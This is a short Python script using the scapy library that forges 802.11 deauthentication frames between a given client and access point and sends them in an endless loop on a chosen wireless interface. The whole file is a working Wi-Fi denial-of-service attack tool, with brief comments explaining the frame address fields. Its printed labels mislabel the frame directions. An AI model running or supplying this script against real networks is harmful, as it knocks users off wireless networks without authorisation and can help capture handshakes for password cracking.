from scapy.all import *
import os
import sys

### Client MAC address
client = sys.argv[1]
### AP MAC address
ap = sys.argv[2]
### Interafce name 
interface = sys.argv[3]


### RadioTap()/Dot11
# addr1: destination MAC address
# addr2: source MAC address
# addr3: BSSID - AP MAC address
# RadioTap is making it easier to transmit information between OSI layers
# Dot11 represent the MAC header, it is the abbreviated specification name 802.11

### Deauthentication packet from client to AP.
pkt_to_ap = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

### Deauthentication packet from AP to client.
pkt_to_c = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()

# count=100

# while count != 0:
while True:
	for i in range(50):

		print ("Sending deauthentication packet from client to AP")
		# sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_ap, iface=interface)
		
		print ("Sending deauthentication packet from AP to client")
		# sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_c, iface=interface)


	# count-=1


